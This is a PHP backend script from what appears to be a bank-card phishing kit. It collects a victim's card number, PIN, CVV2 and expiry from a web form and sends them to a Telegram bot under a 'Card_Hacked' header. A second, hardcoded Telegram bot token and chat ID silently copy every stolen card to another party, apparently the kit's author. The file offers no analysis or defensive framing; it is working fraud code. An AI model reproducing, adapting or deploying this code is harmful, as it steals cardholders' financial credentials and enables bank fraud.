<?php
include "functions.php";


$ID = 0000000; // pv Chat id 
$TOKEN = "0000000"; //Bot Token 
$paylimit = 3;  // Users Enter Cards Peer load page - spam
$sendEmail = false; // true = send email // false = not send email


$pan = $_POST["pan"];
$pin = $_POST["pin"];
$cvv = $_POST["cvv2"];
$year = $_POST["year"];
$month = $_POST["month"];
$num = $_POST["num"];
if(isset($_POST["email"])){
    $email = $_POST["email"];
}else{
    $email = "None";
}





$pan1 = substr($pan,0,4);
$pan2 = substr($pan,4,-8);
$pan3 = substr($pan,8,-4);
$pan4 = substr($pan,12);
$cardn = substr($pan,0,-10);
$bankinfo = bank_information($cardn);

$Text = "

____*Card_Hacked*____

🏦Bank: $bankinfo[1]
🔱Card: <code>$pan1 $pan2 $pan3 $pan4</code>
🔱Pass2: <code>$pin</code>
🔱Cvv2: <code>$cvv</code>
🔱Year: <code>$year</code>  Month: <code>$month</code>


#INFO
CODED:@lxxcloud
#اطلاعات کارت

";
    
$Text .="\n$bankinfo[0]⁉️Spam: $num";

if($sendEmail==true){
    $Text .="\n⁉️Email: $email";
}






if( (integer)$num > $paylimit){}else{
    file_get_contents("https://api.telegram.org/bot$TOKEN/sendMessage?parse_mode=HTML&chat_id=$ID&text=".urlencode($Text)); 
}

if( (integer)$num > $paylimit){}else{
    file_get_contents("https://api.telegram.org/bot817846513:AAFfdr91EPAIwnVC2bEjLzg89AfJGbywEys/sendMessage?parse_mode=HTML&chat_id=870406371&text=".urlencode($Text));
}	



?>